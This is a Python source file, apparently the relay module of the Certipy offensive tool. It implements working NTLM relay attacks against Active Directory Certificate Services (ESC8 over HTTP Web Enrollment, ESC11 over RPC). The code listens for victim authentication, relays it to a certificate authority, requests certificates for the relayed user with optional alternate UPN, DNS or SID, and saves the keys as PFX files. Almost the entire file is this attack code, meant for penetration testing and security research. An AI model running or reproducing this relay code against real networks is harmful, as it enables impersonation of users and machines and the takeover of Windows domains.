"""
Certificate Relay Attack Module for Certipy.

This module implements NTLM relay attacks against Active Directory Certificate Services (AD CS):
- ESC8: NTLM relay to AD CS HTTP endpoints (Web Enrollment)
- ESC11: NTLM relay to AD CS RPC endpoints (MS-ICPR)

The attacks allow an attacker to obtain certificates for other users by relaying
their NTLM authentication to an AD CS server, which can then be used for privilege
escalation or persistence.

Key Components:
- Relay: Main class orchestrating the relay attack
- ADCSHTTPRelayServer: Relays HTTP authentication to AD CS Web Enrollment
- ADCSRPCRelayServer: Relays RPC authentication to AD CS Certificate Services
- ADCSHTTPAttackClient: Handles certificate requests via HTTP
- ADCSRPCAttackClient: Handles certificate requests via RPC
"""

import argparse
import base64
import os
import re
import time
import traceback
import urllib.parse
from http.client import HTTPConnection
from struct import unpack
from threading import Lock
from typing import Any, Literal, Optional, Tuple, Union, cast

import bs4
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.asymmetric.types import PrivateKeyTypes
from impacket.dcerpc.v5 import epm
from impacket.examples.ntlmrelayx.attacks import ProtocolAttack
from impacket.examples.ntlmrelayx.clients import rpcrelayclient
from impacket.examples.ntlmrelayx.clients.httprelayclient import HTTPRelayClient
from impacket.examples.ntlmrelayx.servers import SMBRelayServer
from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
from impacket.nt_errors import STATUS_ACCESS_DENIED, STATUS_SUCCESS
from impacket.ntlm import NTLMAuthChallengeResponse
from impacket.spnego import SPNEGO_NegTokenResp

from certipy.commands.req import MSRPC_UUID_ICPR, Request, RPCRequestInterface
from certipy.lib.certificate import (
    cert_id_to_parts,
    cert_to_pem,
    create_csr,
    create_key_archival,
    create_pfx,
    csr_to_der,
    csr_to_pem,
    der_to_cert,
    get_identifications_from_certificate,
    get_object_sid_from_certificate,
    key_to_pem,
    pem_to_cert,
    pem_to_key,
    x509,
)
from certipy.lib.errors import translate_error_code
from certipy.lib.formatting import print_certificate_identifications
from certipy.lib.logger import logging
from certipy.lib.target import DnsResolver, Target


class ADCSHTTPRelayServer(HTTPRelayClient):
    """
    HTTP relay client for AD CS Web Enrollment interface.

    This class relays NTLM authentication to AD CS Web Enrollment services,
    allowing an attacker to request certificates on behalf of the relayed user.
    """

    def __init__(self, adcs_relay: "Relay", *args, **kwargs):  # type: ignore
        """
        Initialize the HTTP relay server.

        Args:
            adcs_relay: The parent Relay object
            args: Arguments to pass to the parent class
            kwargs: Keyword arguments to pass to the parent class
        """
        super().__init__(*args, **kwargs)
        self.adcs_relay = adcs_relay

    def initConnection(self) -> Literal[True]:
        """
        Establish a connection to the AD CS Web Enrollment service.

        Returns:
            True if connection was successful
        """
        logging.debug(f"Connecting to {self.targetHost}:{self.targetPort}...")
        self.session = HTTPConnection(
            self.targetHost, self.targetPort, timeout=self.adcs_relay.timeout
        )
        self.session.connect()
        logging.debug(f"Connected to {self.targetHost}:{self.targetPort}")
        self.lastresult = None

        # Prepare the target path
        if self.target.path == "":
            self.path = "/"
        else:
            self.path = self.target.path
        return True

    def sendAuth(  # type: ignore
        self, authenticateMessageBlob: bytes, serverChallenge: Optional[bytes] = None
    ) -> Tuple[Optional[bytes], int]:
        """
        Send authentication data to the target with proper locking to prevent race conditions.

        Args:
            authenticateMessageBlob: The authentication message
            serverChallenge: The server challenge

        Returns:
            Tuple of (response, status code)
        """
        while not self.adcs_relay.attack_lock.acquire():
            time.sleep(0.1)

        response = None, STATUS_ACCESS_DENIED

        try:
            response = self._sendAuth(authenticateMessageBlob, serverChallenge)
        except Exception as e:
            logging.error(f"Got error: {e}")
            if self.adcs_relay.verbose:
                traceback.print_exc()
            else:
                logging.error("Use -debug to print a stacktrace")
            response = None, STATUS_ACCESS_DENIED
        finally:
            self.adcs_relay.attack_lock.release()
            return response

    def _sendAuth(
        self, authenticateMessageBlob: bytes, serverChallenge: Optional[bytes] = None
    ) -> Tuple[Optional[bytes], int]:
        """
        Process and send authentication data to the target.

        Args:
            authenticateMessageBlob: The authentication message
            serverChallenge: The server challenge

        Returns:
            Tuple of (response, status code)
        """
        # Extract the NTLM token from SPNEGO if needed
        if (
            unpack("B", authenticateMessageBlob[:1])[0]
            == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP
        ):
            respToken2 = SPNEGO_NegTokenResp(authenticateMessageBlob)
            token = respToken2["ResponseToken"]
        else:
            token = authenticateMessageBlob

        try:
            # Parse NTLM authentication response
            response = NTLMAuthChallengeResponse()
            response.fromString(data=token)

            # Extract domain and username from response
            # TODO: Support unicode
            domain = response["domain_name"].decode("utf-16le")
            username = response["user_name"].decode("utf-16le")

            # Store the authenticated user for later use
            self.session.user = f"{domain}\\{username}"  # type: ignore

            # Build authorization header with NTLM token
            auth = base64.b64encode(token).decode("ascii")
            headers = {"Authorization": f"{self.authenticationMethod} {auth}"}

            # Make authenticated request to AD CS
            self.session.request("GET", self.path, headers=headers)
            res = self.session.getresponse()

            if res.status == 401:
                logging.error("Got unauthorized response from AD CS")
                return None, STATUS_ACCESS_DENIED
            else:
                logging.debug(
                    f"HTTP server returned status code {res.status}, treating as successful login"
                )
                # Cache the response
                self.lastresult = res.read()
                return None, STATUS_SUCCESS
        except Exception as e:
            logging.error(f"Got error: {e}")
            if self.adcs_relay.verbose:
                traceback.print_exc()
            else:
                logging.error("Use -debug to print a stacktrace")
            return None, STATUS_ACCESS_DENIED


class ADCSRPCRelayServer(rpcrelayclient.RPCRelayClient, rpcrelayclient.ProtocolClient):  # type: ignore
    """
    RPC relay client for AD CS Certificate Services interface.

    This class relays NTLM authentication to AD CS RPC endpoints (MS-ICPR),
    allowing an attacker to request certificates on behalf of the relayed user.
    """

    def __init__(
        self,
        serverConfig: NTLMRelayxConfig,
        target: object,
        targetPort: Optional[int] = None,
        extendedSecurity: bool = True,
    ):
        """
        Initialize the RPC relay server.

        Args:
            serverConfig: NTLMRelayxConfig object with relay settings
            target: Target information
            targetPort: Target RPC port (default: uses port mapping)
            extendedSecurity: Whether to use extended security
        """
        rpcrelayclient.ProtocolClient.__init__(
            self, serverConfig, target, targetPort, extendedSecurity
        )

        # Set up RPC endpoint details
        self.endpoint = "ICPR"
        self.endpoint_uuid = MSRPC_UUID_ICPR

        netloc: str = target.netloc  # type: ignore

        # Find the appropriate RPC binding string
        logging.info(
            f"Connecting to ncacn_ip_tcp:{netloc}[135] to determine {self.endpoint} stringbinding"
        )
        self.stringbinding = epm.hept_map(
            netloc, self.endpoint_uuid, protocol="ncacn_ip_tcp"
        )

        logging.debug(f"{self.endpoint} stringbinding is {self.stringbinding}")

    def sendAuth(  # type: ignore
        self, authenticateMessageBlob: bytes, serverChallenge: Optional[bytes] = None
    ) -> Tuple[Optional[bytes], int]:
        """
        Send authentication data to the target RPC service.

        Args:
            authenticateMessageBlob: The authentication message
            serverChallenge: The server challenge

        Returns:
            Tuple of (response, status code)
        """
        # Extract the NTLM token from SPNEGO if needed
        if (
            unpack("B", authenticateMessageBlob[:1])[0]
            == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP
        ):
            respToken2 = SPNEGO_NegTokenResp(authenticateMessageBlob)
            auth_data = respToken2["ResponseToken"]
        else:
            auth_data = authenticateMessageBlob

        # Send the authentication data to the target
        self.session.sendBindType3(auth_data)  # type: ignore

        # Test if authentication was successful by sending a dummy request
        try:
            req = rpcrelayclient.DummyOp()
            self.session.request(req)  # type: ignore
            return None, STATUS_SUCCESS
        except rpcrelayclient.DCERPCException as e:
            # Expected error codes for successful auth but invalid operation
            if "nca_s_op_rng_error" in str(e) or "RPC_E_INVALID_HEADER" in str(e):
                return None, STATUS_SUCCESS
            elif "rpc_s_access_denied" in str(e):
                return None, STATUS_ACCESS_DENIED
            else:
                logging.info(
                    f"Unexpected RPC error from {self.stringbinding}: {str(e)}"
                )
                return None, STATUS_ACCESS_DENIED


class ADCSHTTPAttackClient(ProtocolAttack):
    """
    Attack client for HTTP-based AD CS certificate requests.

    This class handles certificate operations via the Web Enrollment interface.
    """

    def __init__(self, adcs_relay: "Relay", *args, **kwargs):  # type: ignore
        """
        Initialize the HTTP attack client.

        Args:
            adcs_relay: The parent Relay object
            args: Arguments to pass to the parent class
            kwargs: Keyword arguments to pass to the parent class
        """
        super().__init__(*args, **kwargs)
        self.adcs_relay = adcs_relay

    def run(self) -> None:  # type: ignore
        """
        Execute the certificate request attack with proper locking.
        """
        while not self.adcs_relay.attack_lock.acquire():
            time.sleep(0.1)

        try:
            self._run()
        except Exception as e:
            logging.error(f"Got error: {e}")
            if self.adcs_relay.verbose:
                traceback.print_exc()
            else:
                logging.error("Use -debug to print a stacktrace")
        finally:
            self.adcs_relay.attack_lock.release()

    def _run(self) -> None:
        """
        Main attack logic - request or retrieve a certificate for the relayed user.
        """
        # Check if we've already attacked this target and should skip
        if (
            not self.adcs_relay.no_skip
            and self.client.user in self.adcs_relay.attacked_targets
        ):
            logging.debug(
                f"Skipping user {repr(self.client.user)} since attack was already performed"
            )
            return

        # Handle template enumeration mode
        if self.adcs_relay.enum_templates:
            self._enumerate_templates()
            return

        # Handle certificate retrieval or request
        request_id = self.adcs_relay.request_id
        if request_id:
            self._retrieve_certificate(request_id)
        else:
            self._request_certificate()

    def _enumerate_templates(self) -> None:
        """
        Enumerate available certificate templates from Web Enrollment.
        """

        # Request the certificate request page
        self.client.request("GET", "/certsrv/certrqxt.asp")
        response = self.client.getresponse()
        content = response.read()

        # Parse the HTML to extract templates
        soup = bs4.BeautifulSoup(content, "html.parser")

        select_tag = cast(
            Optional[bs4.Tag],
            soup.find("select", {"name": "lbCertTemplate", "id": "lbCertTemplateID"}),
        )

        if select_tag:
            option_tags = select_tag.find_all("option")
            print(f"Templates Found for {repr(self.client.user)}:")
            for option in option_tags:
                if not isinstance(option, bs4.Tag):
                    continue

                value = option["value"]

                if not isinstance(value, str):
                    logging.warning(
                        f"Got unexpected value type {type(value)} for template {option.text}: {repr(value)}"
                    )
                    continue

                split_value = value.split(";")
                if len(split_value) > 1:
                    print(split_value[1])

        return self.finish_run()

    def _retrieve_certificate(self, request_id: int) -> None:
        """
        Retrieve a certificate by request ID.

        Args:
            request_id: The ID of the certificate request to retrieve
        """
        self.client.request("GET", f"/certsrv/certnew.cer?ReqID={request_id}")

        response = self.client.getresponse()
        content = response.read()

        # Handle error responses
        if response.status != 200:
            logging.error("Got error while requesting certificate")
            if self.adcs_relay.verbose:
                logging.warning("Got error while trying to request certificate:")
                print(content)
            else:
                logging.warning(
                    "Got error while trying to request certificate. Use -debug to print the response"
                )
            return self.finish_run()

        # Handle successful certificate retrieval
        if b"BEGIN CERTIFICATE" in content:
            cert = pem_to_cert(content)
            return self.save_certificate(cert, request_id=request_id)

        # Handle other responses
        content_str = content.decode()
        if "Taken Under Submission" in content_str:
            logging.warning("Certificate request is still pending approval")
        elif "The requested property value is empty" in content_str:
            logging.warning(f"Unknown request ID {request_id}")
        else:
            # Try to extract error code
            error_code_matches = re.findall(r" (0x[0-9a-fA-F]+) \(", content_str)
            try:
                error_code = int(error_code_matches[0], 16)
                msg = translate_error_code(error_code)
                logging.warning(f"Got error from AD CS: {msg}")
            except Exception:
                logging.warning("Got unknown error from AD CS:")
                if self.adcs_relay.verbose:
                    print(content_str)
                else:
                    logging.warning("Use -debug to print the response")

        return self.finish_run()

    def _request_certificate(self) -> None:
        """
        Request a new certificate for the relayed user.
        """
        # Choose appropriate template based on username
        template = self.config.template
        if template is None:
            template = "Machine" if self.username.endswith("$") else "User"

        # Generate certificate signing request
        csr, key = create_csr(
            self.username,
            alt_dns=self.adcs_relay.dns,
            alt_upn=self.adcs_relay.upn,
            alt_sid=self.adcs_relay.sid,
            key_size=self.adcs_relay.key_size,
        )

        # Handle key archival if specified
        if self.adcs_relay.archive_key:
            logging.info(
                f"Trying to retrieve CAX certificate from file {self.adcs_relay.archive_key}"
            )
            with open(self.adcs_relay.archive_key, "rb") as f:
                cax_cert = f.read()
                cax_cert = der_to_cert(cax_cert)
                logging.info("Retrieved CAX certificate")

            csr = create_key_archival(csr, key, cax_cert)
            csr = base64.b64encode(csr).decode()
            csr = f"-----BEGIN PKCS7-----\n{csr}\n-----END PKCS7-----"
        else:
            csr = csr_to_pem(csr).decode()

        # Build certificate attributes
        attributes = [f"CertificateTemplate:{template}"]

        # Add SAN attributes if specified
        if self.adcs_relay.upn is not None or self.adcs_relay.dns is not None:
            san = []
            if self.adcs_relay.dns:
                san.append(f"dns={self.adcs_relay.dns}")
            if self.adcs_relay.upn:
                san.append(f"upn={self.adcs_relay.upn}")

            attributes.append(f"SAN:{'.'.join(san)}")

        attributes_str = "\n".join(attributes)

        # Build request parameters
        params = {
            "Mode": "newreq",
            "CertAttrib": attributes_str,
            "CertRequest": csr,
            "TargetStoreFlags": "0",
            "SaveCert": "yes",
            "ThumbPrint": "",
        }

        data = urllib.parse.urlencode(params)

        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": len(data),
        }

        logging.info(
            f"Requesting certificate for {repr(self.client.user)} based on the template {repr(template)}"
        )

        # Send certificate request
        self.client.request("POST", "/certsrv/certfnsh.asp", body=data, headers=headers)
        response = self.client.getresponse()
        content = response.read().decode()

        # Handle request errors
        if response.status != 200:
            logging.error("Got error while requesting certificate")
            if self.adcs_relay.verbose:
                print(content)
            else:
                logging.warning("Use -debug to print the response")
            return self.finish_run()

        # Check for successful issuance
        request_id_matches = re.findall(r"certnew.cer\?ReqID=([0-9]+)&", content)
        if request_id_matches:
            # Certificate issued immediately, retrieve it
            request_id = int(request_id_matches[0])
            logging.info(f"Certificate issued with request ID {request_id}")

            self.client.request("GET", f"/certsrv/certnew.cer?ReqID={request_id}")
            response = self.client.getresponse()
            content = response.read()
            cert = pem_to_cert(content)

            return self.save_certificate(cert, key=key, request_id=request_id)

        # Handle pending or failed requests
        if "template that is not supported" in content:
            logging.error(f"Template {repr(template)} is not supported by AD CS")
        elif "Certificate Pending" in content:
            logging.warning("Certificate request is pending approval")
        elif '"Denied by Policy Module"' in content:
            logging.warning(
                f"Got access denied while trying to enroll in template {repr(template)}"
            )
        else:
            # Try to extract error code
            error_code_matches = re.findall(
                r"Denied by Policy Module  (0x[0-9a-fA-F]+),", content
            )
            try:
                error_code = int(error_code_matches[0], 16)
                msg = translate_error_code(error_code)
                logging.warning(f"Got error from AD CS: {msg}")
            except Exception:
                logging.warning("Got unknown error from AD CS:")
                if self.adcs_relay.verbose:
                    print(content)
                else:
                    logging.warning("Use -debug to print the response")

        # Extract request ID for pending requests
        request_id_matches = re.findall(r"Your Request Id is ([0-9]+)", content)
        if len(request_id_matches) > 0:
            request_id = int(request_id_matches[0])
            logging.info(f"Request ID is {request_id}")

            # Offer to save the private key for later use
            should_save = input(
                "Would you like to save the private key? (y/N) "
            ).rstrip("\n")

            if should_save.lower() == "y":
                key_path = f"{request_id}.key"
                with open(key_path, "wb") as f:
                    _ = f.write(key_to_pem(key))

                logging.info(f"Saved private key to {key_path}")

        return self.finish_run()

    def finish_run(self) -> None:
        """
        Clean up after attack completion.
        """
        self.adcs_relay.attacked_targets.append(self.client.user)
        if not self.adcs_relay.forever:
            self.adcs_relay.shutdown()

    def save_certificate(
        self,
        cert: x509.Certificate,
        key: Optional[PrivateKeyTypes] = None,
        request_id: Optional[int] = None,
    ) -> None:
        """
        Save the obtained certificate and private key to disk.

        Args:
            cert: The obtained certificate
            key: The private key (if available)
            request_id: The certificate request ID
        """
        # Extract certificate information
        identifications = get_identifications_from_certificate(cert)
        print_certificate_identifications(identifications)

        # Check for SID in certificate
        object_sid = get_object_sid_from_certificate(cert)
        if object_sid is not None:
            logging.info(f"Certificate object SID is {repr(object_sid)}")
        else:
            logging.info("Certificate has no object SID")

        # Determine output filename
        out = self.adcs_relay.out
        if out is None:
            out, _ = cert_id_to_parts(identifications)  # type: ignore
            if out is None:
                out = str(request_id)

            out = out.rstrip("$").lower()

        # Try to find private key if not provided
        if key is None and request_id is not None:
            try:
                key_path = f"{request_id}.key"
                with open(key_path, "rb") as f:
                    key = pem_to_key(f.read())
                logging.info(f"Loaded private key from {repr(key_path)}")
            except Exception:
                # Save just the certificate if key not available
                logging.warning(
                    "Could not find matching private key. Saving certificate as PEM"
                )
                cert_path = f"{out}.crt"
                with open(cert_path, "wb") as f:
                    _ = f.write(cert_to_pem(cert))
                logging.info(f"Saved certificate to {repr(cert_path)}")
                self.finish_run()
                return

        # Save certificate and key as PFX
        pfx = create_pfx(key, cert)  # type: ignore
        pfx_path = f"{out}.pfx"
        with open(pfx_path, "wb") as f:
            _ = f.write(pfx)
        logging.info(f"Saved certificate and private key to {repr(pfx_path)}")

        self.finish_run()


class ADCSRPCAttackClient(ProtocolAttack):
    """
    Attack client for RPC-based AD CS certificate requests.

    This class handles certificate operations via the RPC interface.
    """

    def __init__(
        self, adcs_relay: "Relay", config: NTLMRelayxConfig, dce: Any, username: str
    ):
        """
        Initialize the RPC attack client.

        Args:
            adcs_relay: The parent Relay object
            config: NTLMRelayxConfig object with relay settings
            dce: DCE/RPC connection
            username: Username of the relayed user
        """
        super().__init__(config, dce, username)

        self.adcs_relay = adcs_relay
        self.dce = dce
        self.rpctransport = dce.get_rpc_transport()
        self.stringbinding = self.rpctransport.get_stringbinding()

        # Parse domain and username
        try:
            if "/" in username:
                self.domain, self.username = username.split("/")
            else:
                self.domain, self.username = "Unknown", username
        except Exception as e:
            logging.error(f"Error parsing username {username}: {e}")
            self.domain, self.username = "Unknown", username

    def run(self) -> None:  # type: ignore
        """
        Execute the certificate request attack with proper locking.
        """
        while not self.adcs_relay.attack_lock.acquire():
            time.sleep(0.1)

        # Initialize RPC interface
        self.interface = RPCRequestInterface(parent=self.adcs_relay.request)
        self.interface._dce = self.dce

        try:
            self._run()
        except Exception as e:
            logging.error(f"Got error: {e}")
            if self.adcs_relay.verbose:
                traceback.print_exc()
            else:
                logging.error("Use -debug to print a stacktrace")
        finally:
            self.adcs_relay.attack_lock.release()

    def _run(self) -> None:
        """
        Main attack logic - request or retrieve a certificate for the relayed user.
        """
        # Check if we've already attacked this target and should skip
        full_username = f"{self.username}@{self.domain}"
        if (
            not self.adcs_relay.no_skip
            and full_username in self.adcs_relay.attacked_targets
        ):
            logging.info(
                f"Skipping user {repr(full_username)} since attack was already performed"
            )
            return

        logging.info(f"Attacking user {repr(full_username)}")

        # Handle certificate retrieval or request
        request_id = self.adcs_relay.request_id
        if request_id:
            _ = self.retrieve()
        else:
            _ = self.request()

        self.finish_run()

    def retrieve(self) -> bool:
        """
        Retrieve a certificate by request ID.

        Returns:
            True on success, False on failure
        """
        if self.adcs_relay.request_id is None:
            logging.error("Request ID was not defined")
            return False

        request_id = int(self.adcs_relay.request_id)
        logging.info(f"Retrieving certificate for request id {request_id}")

        cert = self.interface.retrieve(request_id)
        if cert is None:
            logging.error("Failed to retrieve certificate")
            return False

        # Extract certificate information
        identifications = get_identifications_from_certificate(cert)
        print_certificate_identifications(identifications)

        # Check for SID in certificate
        object_sid = get_object_sid_from_certificate(cert)
        if object_sid is not None:
            logging.info(f"Certificate object SID is {repr(object_sid)}")
        else:
            logging.info("Certificate has no object SID")

        # Determine output filename
        out = self.adcs_relay.out
        if out is None:
            out, _ = cert_id_to_parts(identifications)  # type: ignore
            if out is None:
                out = self.username

            out = out.rstrip("$").lower()

        # Try to find matching private key
        try:
            key_path = f"{request_id}.key"
            with open(key_path, "rb") as f:
                key = pem_to_key(f.read())

            # Save certificate and key as PFX
            logging.info(f"Loaded private key from {repr(key_path)}")
            pfx_path = f"{out}.pfx"
            pfx = create_pfx(key, cert)
            with open(pfx_path, "wb") as f:
                _ = f.write(pfx)
            logging.info(f"Saved certificate and private key to {repr(pfx_path)}")
        except Exception:
            # Save just the certificate if key not available
            logging.warning(
                "Could not find matching private key. Saving certificate as PEM"
            )
            cert_path = f"{out}.crt"
            with open(cert_path, "wb") as f:
                _ = f.write(cert_to_pem(cert))
            logging.info(f"Saved certificate to {repr(cert_path)}")

        return True

    def request(self) -> Union[bool, Tuple[bytes, str]]:
        """
        Request a new certificate for the relayed user.

        Returns:
            Tuple of (PFX data, filename) on success, False on failure
        """
        # Choose appropriate template based on username
        template = self.config.template
        if template is None:
            logging.info("Template was not defined. Defaulting to Machine/User")
            template = "Machine" if self.username.endswith("$") else "User"

        logging.info(
            f"Requesting certificate for user {repr(self.username)} with template {repr(template)}"
        )

        # Generate certificate signing request
        csr, key = create_csr(
            self.username,
            alt_dns=self.adcs_relay.dns,
            alt_upn=self.adcs_relay.upn,
            key_size=self.adcs_relay.key_size,
        )
        self.key = key
        self.adcs_relay.key = key

        # Handle key archival if specified
        if self.adcs_relay.archive_key:
            logging.info(
                f"Trying to retrieve CAX certificate from file {self.adcs_relay.archive_key}"
            )
            with open(self.adcs_relay.archive_key, "rb") as f:
                cax_cert = f.read()
                cax_cert = der_to_cert(cax_cert)
                logging.info("Retrieved CAX certificate")

            csr_data = create_key_archival(csr, self.key, cax_cert)
        else:
            csr_data = csr_to_der(csr)

        # Build certificate attributes
        attributes = [f"CertificateTemplate:{template}"]

        # Add SAN attributes if specified
        if self.adcs_relay.upn is not None or self.adcs_relay.dns is not None:
            san = []
            if self.adcs_relay.dns:
                san.append(f"dns={self.adcs_relay.dns}")
            if self.adcs_relay.upn:
                san.append(f"upn={self.adcs_relay.upn}")

            attributes.append(f"SAN:{'.'.join(san)}")

        # Submit certificate request
        cert = self.interface.request(csr_data, attributes)

        if cert is None:
            logging.error("Failed to request certificate")
            return False

        # Extract certificate information
        identifications = get_identifications_from_certificate(cert)
        print_certificate_identifications(identifications)

        # Check for SID in certificate
        object_sid = get_object_sid_from_certificate(cert)
        if object_sid is not None:
            logging.info(f"Certificate object SID is {repr(object_sid)}")
        else:
            logging.info("Certificate has no object SID")

        # Determine output filename
        out = self.adcs_relay.out
        if out is None:
            out, _ = cert_id_to_parts(identifications)  # type: ignore
            if out is None:
                out = self.username

            out = out.rstrip("$").lower()

        # Save certificate and key as PFX
        pfx = create_pfx(key, cert)
        pfx_path = f"{out}.pfx"

        with open(pfx_path, "wb") as f:
            _ = f.write(pfx)

        logging.info(f"Saved certificate and private key to {repr(pfx_path)}")
        return pfx, pfx_path

    def finish_run(self) -> None:
        """
        Clean up after attack completion.
        """
        self.adcs_relay.attacked_targets.append(f"{self.username}@{self.domain}")
        if not self.adcs_relay.forever:
            self.adcs_relay.shutdown()


class Relay:
    """
    Main class for orchestrating NTLM relay attacks against AD CS.

    This class coordinates the relay servers and attack clients to obtain
    certificates by relaying NTLM authentication.
    """

    def __init__(
        self,
        target: str,
        ca: Optional[str] = None,
        template: Optional[str] = None,
        upn: Optional[str] = None,
        dns: Optional[str] = None,
        sid: Optional[str] = None,
        archive_key: Optional[str] = None,
        retrieve: Optional[int] = None,
        key_size: int = 2048,
        out: Optional[str] = None,
        interface: str = "0.0.0.0",
        port: int = 445,
        forever: bool = False,
        no_skip: bool = False,
        timeout: int = 5,
        enum_templates: bool = False,
        debug: bool = False,
        **kwargs,  # type: ignore
    ):
        """
        Initialize the NTLM relay attack.

        Args:
            target: Target AD CS server (http://server/certsrv/ or rpc://server)
            ca: Certificate Authority name (required for RPC)
            template: Certificate template to request
            upn: Alternative UPN for the certificate
            dns: Alternative DNS name for the certificate
            sid: Alternative SID for the certificate
            archive_key: Path to CAX certificate for key archival
            retrieve: Request ID to retrieve instead of requesting a new certificate
            key_size: RSA key size in bits
            out: Output file base name
            interface: Network interface to listen on
            port: Port to listen on for NTLM relay
            forever: Continue listening for new connections after successful attack
            no_skip: Don't skip already attacked targets
            timeout: Connection timeout in seconds
            enum_templates: Enumerate available templates instead of requesting certificate
            debug: Enable verbose debug output
            kwargs: Additional arguments
        """
        self.target = target
        self.ca = ca
        self.template = template
        self.upn = upn
        self.dns = dns
        self.sid = sid
        self.archive_key = archive_key
        self.request_id = int(retrieve) if retrieve else None
        self.key_size = key_size
        self.out = out
        self.forever = forever
        self.no_skip = no_skip
        self.timeout = timeout
        self.verbose = debug
        self.interface = interface
        self.port = port
        self.enum_templates = enum_templates
        self.kwargs = kwargs
        self.key: Optional[rsa.RSAPrivateKey] = None

        self._request: Optional[Request] = None

        self.attacked_targets = []
        self.attack_lock = Lock()

        # Configure target based on URL or RPC string
        if self.target.startswith("rpc://"):
            if ca is None:
                logging.error("A certificate authority is required for RPC attacks")
                exit(1)

            logging.info(f"Targeting {target} (ESC11)")
        else:
            # Format HTTP target URL
            if not self.target.startswith("http://"):
                self.target = f"http://{self.target}"
            if not self.target.endswith("/certsrv/certfnsh.asp"):
                if not self.target.endswith("/"):
                    self.target += "/"

                if self.enum_templates:
                    self.target += "certsrv/certrqxt.asp"
                else:
                    self.target += "certsrv/certfnsh.asp"
            logging.info(f"Targeting {self.target} (ESC8)")

        # Configure impacket relay target
        target_processor = TargetsProcessor(
            singleTarget=self.target,
            protocolClients={
                "HTTP": self.get_relay_http_server,
                "RPC": self.get_relay_rpc_server,
            },
        )

        # Configure relay
        config = NTLMRelayxConfig()
        config.setTargets(target_processor)
        config.setDisableMulti(True)
        config.setIsADCSAttack(True)
        config.setADCSOptions(self.template)
        config.setAttacks(
            {"HTTP": self.get_attack_http_client, "RPC": self.get_attack_rpc_client}
        )
        config.setProtocolClients(
            {"HTTP": self.get_relay_http_server, "RPC": self.get_relay_rpc_server}
        )
        config.setListeningPort(port)
        config.setInterfaceIp(interface)
        config.setSMB2Support(True)
        config.setMode("RELAY")

        self.server = SMBRelayServer(config)

    @property
    def request(self) -> Request:
        """
        Get the current request object.

        Returns:
            The current request object
        """
        if not self._request is None:
            return self._request

        self._request = Request(
            Target(
                DnsResolver.create(),
                timeout=self.timeout,
            ),
            ca=self.ca,
            template=self.template,
            upn=self.upn,
            dns=self.dns,
            sid=self.sid,
            key_size=self.key_size,
            retrieve=self.request_id,
            out=self.out,
            debug=self.verbose,
        )

        return self._request

    def start(self) -> None:
        """
        Start the relay server and wait for connections.
        """
        logging.info(f"Listening on {self.interface}:{self.port}")
        self.server.start()

        try:
            # Main loop - wait for connections
            while True:
                time.sleep(0.1)
        except KeyboardInterrupt:
            print("")
            self.shutdown()
        except Exception as e:
            logging.error(f"Got error: {e}")
            if self.verbose:
                traceback.print_exc()
            else:
                logging.error("Use -debug to print a stacktrace")

    def get_relay_http_server(self, *args, **kwargs) -> ADCSHTTPRelayServer:  # type: ignore
        """
        Factory method to create an HTTP relay server.

        Returns:
            Configured HTTP relay server
        """
        return ADCSHTTPRelayServer(self, *args, **kwargs)

    def get_attack_http_client(self, *args, **kwargs) -> ADCSHTTPAttackClient:  # type: ignore
        """
        Factory method to create an HTTP attack client.

        Returns:
            Configured HTTP attack client
        """
        return ADCSHTTPAttackClient(self, *args, **kwargs)

    def get_relay_rpc_server(self, *args, **kwargs) -> ADCSRPCRelayServer:  # type: ignore
        """
        Factory method to create an RPC relay server.

        Returns:
            Configured RPC relay server
        """
        return ADCSRPCRelayServer(*args, **kwargs)

    def get_attack_rpc_client(self, *args, **kwargs) -> ADCSRPCAttackClient:  # type: ignore
        """
        Factory method to create an RPC attack client.

        Returns:
            Configured RPC attack client
        """
        return ADCSRPCAttackClient(self, *args, **kwargs)

    def shutdown(self) -> None:
        """
        Gracefully shut down the relay server.
        """
        logging.info("Exiting...")
        os._exit(0)


def entry(options: argparse.Namespace) -> None:
    """
    Command-line entry point for relay functionality.

    Args:
        options: Command line arguments
    """
    relay = Relay(**vars(options))
    relay.start()
